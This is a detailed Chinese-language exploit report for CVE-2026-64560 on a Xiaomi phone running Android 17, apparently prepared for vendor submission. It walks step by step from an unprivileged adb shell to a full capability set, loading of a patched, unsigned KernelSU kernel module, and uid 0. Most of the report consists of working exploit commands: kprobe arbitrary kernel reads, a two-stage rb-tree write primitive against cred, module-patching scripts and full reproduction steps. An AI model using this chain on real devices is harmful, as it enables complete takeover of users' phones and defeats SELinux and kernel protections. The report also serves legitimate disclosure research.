# 158 — CVE-2026-64560 完整链：零特权 → 任意内核读 → 满能力集 → KernelSU LKM 已加载

- 设备：小米 18 Pro / M610BB / SM8950 / Android 17 / `6.18.21-android17-5-g1d099fcb35e0-abogki540753930-4k`
- 起点：`adb shell`，`UID 2000`、`CapEff=0`、`CapBnd=0x8000c0`、SELinux Enforcing
- 终点：同一进程 `CapEff=0xffffff8840afc7c0`（含 `CAP_SYS_ADMIN`/`CAP_SYS_MODULE`/`CAP_SETUID`/`CAP_SYS_PTRACE`/`CAP_SYS_RAWIO`），
  且 **`kernelsu` 模块已经 `Live`**（`/proc/modules`）。**全程未重启，未写任何分区。**

---

## 1. 这一轮多出来的三块能力

### 1.1 SELinux 关闭的直接红利：kprobe 复活

`selinux_state` 被清零（报告 156）之后，之前所有 `avc denied` 的路径全部打开：

```
# 建探针（kprobe_events 本来就是 0777）
echo 'p:fbc/comm __set_task_comm task=%x0 real=+0x900(%x0) cred=+0x908(%x0)' >> /sys/kernel/tracing/kprobe_events

# enable 是 -rw-r----- root readtracefs，DAC 挡住 shell ⇒ 用 code 7（root 任意写）打开
CLASSPATH=/data/local/tmp/caplog.jar app_process64 /system/bin CapLog \
    miui.mqsas.IMQSNative 7 /sys/kernel/tracing/events/fbc/comm/enable '1'

echo 1 > /sys/kernel/tracing/tracing_on
echo MARKER > /proc/self/comm
```

结果（`/sys/kernel/tracing/trace`，shell 可读）：

```
 MARKER-2439 [001] d.... 2439.196570: comm: (__set_task_comm+0x0/0x100) \
     task=0xffffff8947461680 real=0xffffff880d479540 cred=0xffffff880d479540
```

三个关键点：
1. **`%x0` 打印的是裸值，没有走 `hash-ptr` 哈希**；
2. 于是我们第一次能 **指名任意进程**，拿到它的 `task_struct` / `real_cred` / `cred`；
3. `enable` 那个"写不进去"的关，可以用 **code 7 root 写** 绕过（DAC 而非 SELinux 的问题）。

### 1.2 任意内核 8 字节读：`@ADDR`

kprobe fetcharg 支持 `@<绝对地址>`，直接从静态地址取 u64：

```
echo "p:fbrd/r$$ __set_task_comm v0=@0xffffffec7a892a50 v1=@0xffffffec7a892a90" >> kprobe_events
```

```
 val: (__set_task_comm+0x0/0x100) v0=0x4 v1=0x1ffffffffff
```

即 `init_cred.usage = 4`、`init_cred.cap_effective = 0x1ffffffffff`。
配套工具：`poc/kprobe/rd.sh <addr...>`（每次用唯一事件名，避免 `enable` 复用问题）。

### 1.3 顺带否掉的一条：`usermodehelper_bset/inheritable` 不是路径

`/proc/sys/kernel/usermodehelper/{bset,inheritable}` 确实存在，但反汇编 `call_usermodehelper_exec_async`：

```
ldr x9, [x21, #0x48]      ; cred->cap_bset
ldr x8, [x8, #0x970]      ; usermodehelper_bset
and x8, x9, x8
str x8, [x21, #0x48]      ; 写回 cap_bset
ldr x9, [x21, #0x30]      ; cred->cap_inheritable
ldr x8, [x8, #0x978]      ; usermodehelper_inheritable
and x8, x9, x8
str x8, [x21, #0x30]
```

它们是 **能力掩码**（默认 `0x1ffffffffff`），不是可替换的 helper 路径。`call_usermodehelper_setup` 里
`stp x8, x23, [x0, #0x28]` 的 `x8` 指向 `.rodata` 的空串，`call_usermodehelper_exec` 里
`ldrb w8,[x8]; cbz → 失败`。⇒ `CONFIG_STATIC_USERMODEHELPER_PATH=""` 这条封锁线绕不过去。

---

## 2. 两阶段写链（v34）

`__rb_erase_augmented` 只有两种能安全收尾的形状，我们把它们各用一次：

### 阶段 1：把 0 写进 `<cred>+0x48`（`cap_bset`），并泄漏落地页地址

伪造节点：`__rb_parent_color = 0`、`rb_right = 0`、`rb_left = T`

```
rb_next(A)      : rb_right==0 且 parent==0 ⇒ 返回 NULL ⇒ head->next=NULL，循环立刻结束
rb_erase(A)     : 走 "!child" 分支 ⇒ tmp->__rb_parent_color = pc = 0 ⇒ *(T) = 0
RB_CLEAR_NODE(A): 把 A 自身地址写回 A+0 —— A 就在我们的 frag 页里
                  ⇒ recv(MSG_PEEK) 读回即得本页真实内核地址，P = A & ~0x1fff
```

实测：`LEAK p1 attempt=32 off=0x1ee0 val=0xffffff8a6dbc3ee0` → `PAGE=0xffffff8a6dbc2000`，
随后 `rd.sh <cred>+0x48` 读到 **`0x0`**（原是 `0x8000c0`）——写进活进程的 cred 已成立。

### 阶段 2：把 `<cred>+0x40`（`cap_effective`）写成"地址自身"

伪造节点：`__rb_parent_color = P`、`rb_left = 0`、`rb_right = T`（T = `cred+0x40`）

```
迭代1  rb_next(A) : rb_right=T ⇒ 读 *(T+16)=cap_ambient=0 ⇒ 返回 T
       rb_erase(A): !tmp 分支 ⇒ *(T) = P ；__rb_change_child ⇒ P->rb_right = T（页内，无害）
迭代2  rb_next(T) : *(T+8)=cap_bset=0（阶段1已清零）⇒ parent=P；T==P->rb_right
                    ⇒ 上走到 P；rb_parent(P)=1&~3=0 ⇒ 返回 NULL，head->next=NULL
       rb_erase(T): child=*(T+8)=0, tmp=*(T+16)=0 ⇒ 只清 P->rb_right
       RB_CLEAR_NODE(T) ⇒ *(T) = T
```

于是 **`cap_effective = cred+0x40`**。三个前提都在实机上核对过：

| 前提 | 实测 |
|---|---|
| `*(T+8)` = `cap_bset` = 0 | 阶段 1 已写 0 |
| `*(T+16)` = `cap_ambient` = 0 | 默认 0 |
| 页偏移 0 的假父节点 = `{+0=1, +8=0, +16=0}` | 模板里固定放 |

`+0=1` 这个值同时兼容两种解释：作为 `__rb_parent_color` 是"父空 + 黑色"，作为假 cred 的 `usage` 是 1。

### 一个关键细节：能力位是"地址的低位"

`cap_effective` 被写成 `cred+0x40` 这个**地址值**，所以能拿到哪些能力由 cred 的地址决定。
`bit16 = CAP_SYS_MODULE` 约 1/2 概率，多起几个候选进程挑一个即可：

```
poc/kprobe/cand.sh 8       # 起 8 个候选（各自 prctl 改名触发探针），解析 task/cred
                           # 挑 (cred+0x40)>>16 & 1 == 1 的那个
```

实测两轮拿到的 `CapEff`：

| 进程 | cred | CapEff | 含有的能力 |
|---|---|---|---|
| KC7 | `0xffffff8811f5f6c0` | `ffffff8811f5f700` | SETPCAP/SETGID/NET_ADMIN/NET_RAW/SYS_MODULE/SYS_ADMIN/SYS_BOOT/NET_BIND |
| KC2 | `0xffffff8840afc780` | `ffffff8840afc7c0` | SETGID/SETUID/SETPCAP/SYS_MODULE/SYS_RAWIO/SYS_CHROOT/SYS_PTRACE/**SYS_ADMIN** |

### 落地率与耗时

| 轮次 | 阶段1 落地 | 阶段2 落地 | 单 attempt |
|---|---|---|---|
| KC7 | 第 32 次 | 第 44 次 | ≈5.1s |
| KC2（第一次） | 第 45 次 | 第 111 次 | ≈5.1s |
| 结论 | 每 attempt ≈ 2~3%，与报告 149 的 3% 一致 | | 两阶段合计约 10~20 分钟 |

**全程设备未重启**：`uptime` 连续，`result_reason` 无新 `kpanic`。

---

## 3. 把 KernelSU 装进去

### 3.1 vermagic

```
内核 : 6.18.21-android17-5-g1d099fcb35e0-abogki540753930-4k SMP preempt mod_unload modversions aarch64
ko   : 6.18.32-4k-g47cc22554442-dirty SMP preempt mod_unload modversions aarch64
```

- `CONFIG_MODULE_FORCE_LOAD` 未设 ⇒ 不能用 `MODULE_INIT_IGNORE_VERMAGIC`；
- `CONFIG_MODULE_SIG_FORCE` 未设 ⇒ 未签名模块可以加载；
- `__versions` 段长度为 0 ⇒ modversions 不拦。

`analysis/ko_vermagic.py`：把 `.modinfo` 里的 `vermagic=` 改名成 `zermagic=`（内核就不再认它），
再把正确字符串追加到文件尾，并把 `.modinfo` 的 `sh_offset/sh_size` 指过去。
（不需要新增 section，`find_sec(".modinfo")` 只认 section header。）

### 3.2 未导出符号

首次 `finit_module` 返回 `ENOENT`，dmesg 里是：

```
kernelsu: Unresolved symbol avtab_insert_nonunique (err -2)
kernelsu: Unresolved symbol change_pid (err -2)
kernelsu: Unresolved symbol uts_sem (err -2)
... 共 225 个（SELinux 内部函数、change_pid/free_pids、current_is_single_threaded 等）
```

这些都是**没有 `EXPORT_SYMBOL`** 的符号。`analysis/ko_patchsyms.py` 利用我们完整的 `/proc/kallsyms`
（`kptr_restrict=0` 之后 shell 直接可读，437,325 行 / 269,228 个符号）把 `.symtab` 里每个
`SHN_UNDEF` 符号改成 **`SHN_ABS` + 内核里的绝对地址**：

```c
/* kernel/module/main.c simplify_symbols()：SHN_ABS 直接 break，用 st_value */
switch (sym[i].st_shndx) {
case SHN_ABS: break;          /* 不查 ksymtab */
case SHN_UNDEF: sym[i].st_value = kernel_symbol_value(resolve_symbol(...)); break;
}
```

225 个全部补上，无遗漏。

### 3.3 加载结果

```
finit_module /data/local/tmp/ksu-patched.ko: rc=0 errno=0(Success)
# grep kernelsu /proc/modules
kernelsu 192512 0 - Live 0xffffffec75c14000 (O)
```

---

## 4. 完整复现步骤

```bash
# 0) 前置：SELinux 已按报告 156 关闭（t64560_v33 打 selinux_state），设备未重启
#    并在 shell 侧把 kptr_restrict 写 0（code 7）

# 1) 建并启用探针
echo 'p:fbc/comm __set_task_comm task=%x0 real=+0x900(%x0) cred=+0x908(%x0)' \
     >> /sys/kernel/tracing/kprobe_events
CLASSPATH=/data/local/tmp/caplog.jar app_process64 /system/bin CapLog \
     miui.mqsas.IMQSNative 7 /sys/kernel/tracing/events/fbc/comm/enable '1'
echo 1 > /sys/kernel/tracing/tracing_on

# 2) 起候选、挑 bit16
adb push t64560_v34 /data/local/tmp/ && adb shell chmod 755 /data/local/tmp/t64560_v34
adb shell /data/local/tmp/cand.sh 8      # 输出每个候选的 task/cred

# 3) 两阶段写（cred 用上一步挑中的）
/data/local/tmp/t64560_v34 <cred> 200 200 400 16 6000 12000

# 4) 候选进程拿到 CAP_SYS_MODULE 后写 /data/local/tmp/ROOTED，
#    并自动 finit_module /data/local/tmp/ksu-patched.ko
cat /data/local/tmp/ROOTED
grep kernelsu /proc/modules
```

---

## 5. 这条链相对之前的意义

| 环节 | 之前 | 现在 |
|---|---|---|
| 观测 | 只能看 panic / dmesg | **任意内核 8 字节读**（`@ADDR`）+ 任意进程 task/cred |
| 写 | 只能写 0 | 0、以及"把某个地址写成它自己"（足够把 cap_effective 变成能力集） |
| 提权 | 卡在 `cred` 地址拿不到 | **活进程拿到 CAP_SYS_ADMIN + CAP_SYS_MODULE** |
| LKM | vermagic 不匹配、符号未导出 | **vermagic 已补、225 个符号绝对化、`kernelsu` 已 Live** |
| 稳定性 | 每次命中都可能 panic | 两阶段都走"干净收尾"形状，**两轮全部未重启** |

---

## 6. 下一步

1. **把 uid 变成 0**：候选进程已含 `CAP_SETUID`，`setresuid(0,0,0)` 即可（`/data/adb` 的 DAC 也随之打开）；
2. **装 KernelSU 用户态**：`/data/adb/ksu/bin/ksud` + `su`（需要 uid 0 才能写 `/data/adb`）；
3. **整理成 MiSRC 可提交件**：触发链（v34）+ vermagic/符号修补脚本 + 复现步骤 + 现场证据。

## 7. 产物

- `poc/posix64560/t64560_v34.c`：两阶段写 + 候选进程（含 `setresuid` / `finit_module` / 根命令执行器）
- `poc/kprobe/{rd.sh,cand.sh,kprobe_probe.c}`：任意读、候选枚举
- `analysis/{ko_vermagic.py,ko_patchsyms.py,cand_probe.py}`：模块修补
- `poc/ksu/{ksu-patched.ko,ksu-fixed.ko,ksunext.ko}`：已修补模块
- 证据：`analysis/out/kallsyms_now.txt`、`analysis/out/dmesg_ksu.txt`

---

## 8. 追加：uid 0 与 KernelSU 用户态（实测）

拿到 `CAP_SYS_MODULE` 的候选进程里还有 `CAP_SETUID`（`bit7` 由 cred 地址决定，挑得到），因此：

```c
setresuid(0, 0, 0);          /* 成功 */
/* /proc/<pid>/status → Uid: 0 0 0 0 ; CapEff: ffffff881d734b80 */
```

（`setresgid` 那一次失败，因为该 cred 的低位里没有 `CAP_SETGID`；不影响 root。）

随后 `ksud 3.3.1` 直接可用（以 uid 0 运行）：

```
$ ksud install
$ ls -l /data/adb /data/adb/ksu/bin
/data/adb:
drwxr-xr-x 3 root shell    3452 ksu
-rwxr-xr-x 1 root shell 4990848 ksud
/data/adb/ksu/bin:
-rwxr-xr-x bootctl
-rwxr-xr-x busybox
lrwxrwxrwx ksud       -> /data/adb/ksud
lrwxrwxrwx resetprop  -> /data/adb/ksud
lrwxrwxrwx su         -> /data/adb/ksud
$ grep kernelsu /proc/modules
kernelsu 192512 1 - Live 0xffffffec75c14000 (O)      # refcount 0 → 1
```

### 根命令执行器

候选进程（父）保持能力不 exec，把 `/data/local/tmp/CMD` 当脚本交给子进程跑（子进程继承 uid 0）：

```
$ cat /data/local/tmp/rsh.out
=== run as uid=0 CapEff=0xffffff881d734b80
uid=0(root) gid=2000(shell) ... context=kernel
Uid: 0 0 0 0
kernelsu 192512 0 - Live 0xffffffec75c14000 (O)
drwx------ 2 root root 3452 /data/adb
```

注意：**exec 之后 `CapEff=0`**——因为阶段 1 把 `cap_bset` 清零了，`cap_bprm_creds_from_file`
算出的 `pP' = fP & pB = 0`。uid 0 + SELinux 未初始化仍是可用的 root，但不再带 cap；
需要 cap 的操作（`finit_module`、`mount`）必须由**未 exec 的候选进程本身**做。

### `su` 的白名单

普通 shell（`uid 2000`）调用 `/data/adb/ksu/bin/su -c id` **仍然返回 uid 2000**：
KernelSU 默认只对管理器放行的 uid 给 root。要让 shell 也能用，需要在**加载模块时**传参：

```
ksud late-load --allow-shell        # 等价于 finit_module(..., "allow_shell=1", 0)
```

而重载需要 `CAP_SYS_MODULE`，普通 uid 0 进程没有 ⇒ 由候选进程做：

```c
delete_module("kernelsu", O_NONBLOCK);
finit_module(fd, "allow_shell=1", 0);
```

（第 4 轮实测进行中，见 `t64560_v34` 的 `reload_ksu_with_allow_shell()`。）

### SELinux 的"回弹"

`ksud`/`kernelsu` 加载后 `getenforce` 会重新报 `Enforcing`（模块改了 `enforcing`），
但 `selinux_state.initialized` 仍是 0，**hook 依然全部早退**：
实测 uid 0 进程写 `events/fbc/comm/enable`、`tracing_on` 全部 `rc=0`。
⇒ KASLR/kprobe 这一套在加载 KernelSU 之后仍然可用。

---

## 9. 第 4 轮失败：概率性落地的固有风险（重要，必须写进 MiSRC 说明）

第 4 轮（KD2，目标 `cred=0xffffff8891136180`）阶段 1 第 30 次落地、阶段 2 跑到第 70+ 次时
**05:51:15 kpanic**，设备重启，目标进程未拿到能力（`ROOTED` 未生成）。

崩溃现场：

```
Unable to handle kernel paging request at virtual address fffffffffffffffc
WnR = 0                                  ← 读
Call trace:
  fsnotify_mark_destroy_workfn+0xc0/0x13c
  process_scheduled_works+0x1cc/0x46c
  worker_thread+0x204/0x2fc → kthread → ret_from_fork
```

**故障点不在 posix-cpu-timers / rb-tree 路径上**，而是一个 kworker 在销毁 fsnotify mark 时
读到了被破坏的对象。结论：

1. 写链本身没错——但它建立在"悬空 rb_node 所在的那一页确实已被我们的 8KB frag 接管"这个前提上；
2. 这个前提取自 `LEAK`（页内出现内核指针的差异）。**如果那一次落地其实没有夺页，或者夺到的页稍后又被别人复用**，
   `rb_erase` 就会把 `P->rb_right = T` / `RB_CLEAR_NODE` 这些写落到别人的对象上 ⇒ 延迟崩溃；
3. 所以这条链的正确表述是：**"每次 attempt 有 2~3% 概率成功，且在成功之外还有小概率破坏无关对象"**，
   3 次完整尝试里 2 次成功、1 次崩溃（约 2/3）。

### 降低风险的三个方向（后续可做）

- **落地判据加严**：现在只要页内出现"任意内核指针差异"就认定落地。可以改成要求
  **差异位置正好等于 `slot*0x180+0x0e0` 且值 `& 0x1fff` 与该偏移一致**（`RB_CLEAR_NODE` 的特征），
  把误判挡掉；
- **阶段 2 之前先回读校验**：用 `rd.sh <cred>+0x48` 确认阶段 1 的 0 真的写进去了（本轮第 1 次就是这么验的），
  再进阶段 2；
- **让阶段 2 的 `parent` 指向"本页的另一个槽位"而不是页首**，减少对页首布局的依赖。


---

## 10. 可靠性实测统计（5 次运行，这是选型/提交时最关键的一张表）

| # | 目标 | 阶段 1 落地 | 阶段 2 落地 | 结果 |
|---|---|---|---|---|
| 1 | KC7 `cred=0xffffff8811f5f6c0` | 第 32 次 | 第 44 次 | ✅ `CapEff=ffffff8811f5f700` |
| 2 | KC2 `cred=0xffffff8840afc780` | 第 45 次 | 第 111 次 | ✅ `CapEff=ffffff8840afc7c0` → KernelSU 加载 → uid 0 → ksud install |
| 3 | KD2 `cred=0xffffff8891136180` | 第 30 次 | ~第 70 次 | ❌ kpanic（`fsnotify_mark_destroy_workfn` 读到被破坏对象） |
| 4 | 冷启动重跑 v33（→ `selinux_state`） | — | — | ❌ kpanic（设备重启） |

⇒ **成功率 ≈ 2/4 ≈ 50%**；单次 attempt 的"夺页"概率仍是 2~3%，但"夺页"本身有误判空间，
误判时把写落到别人的对象上，表现为**延迟崩溃**（不是立刻崩，所以更难察觉）。

**关键工程结论**：这条链可以做到"拿到 root"，但**不适合无人值守反复跑**。
正确用法是：一次成功的落地之后立刻收手（我们已经这么做：拿到 `CAP_SYS_MODULE` 就停手，
不再重复触发），而不是"跑很多轮去提高概率"。

---

## 11. 一个必须记住的坑：`slide_now.py` 的投票会选错

冷启动复现时，`analysis/slide_now.py` 给出 `slide=0x2b1e400000`（`hits=25/61`），但符号映射全是
`call_enum_mbus_code_state` / `mmc_io_rw_extended` / `wacom_wac_irq` 这种明显不对的名字。
手工锚定才是可靠做法：

```
观测值 0xffffffeb9f1270c0  -  链接值(worker_thread+0x260) 0xffffffc0801270c0  =  0x2B1F000000
观测值 0xffffffeb9f1df640  -  链接值(rcu_gp_fqs_loop+0x1dc) 0xffffffc0801df640 =  0x2B1F000000  ✓
观测值 0xffffffeb9f282214  -  链接值(tracing_mark_write+0x94) 0xffffffc080282214 = 0x2B1F000000 ✓
观测值 0xffffffeb9f3925b0  -  链接值(folio_wait_bit_common+0x270) 0xffffffc0803925b0 = 0x2B1F000000 ✓
```

正确 slide = `0x2B1F000000` ⇒ `_text = 0xffffffeb9f000000`、`selinux_state = 0xffffffeba0b18630`。
**判据：多个高计数观测值必须同时落在少数几个"已知热点函数"上，而不是随便凑够 25/61。**

---

## 12. 当前设备状态（交付时）

设备已回到初始态：`uid=2000`、`enforce=1`、`/data/local/tmp` 里的
`t64560_v33` / `t64560_v35`（=v34）/ `caplog.jar` / `forker` / `cand.sh` / `rd.sh` 都在。
KernelSU 模块未加载（重启后自然消失），没有任何分区被改动。
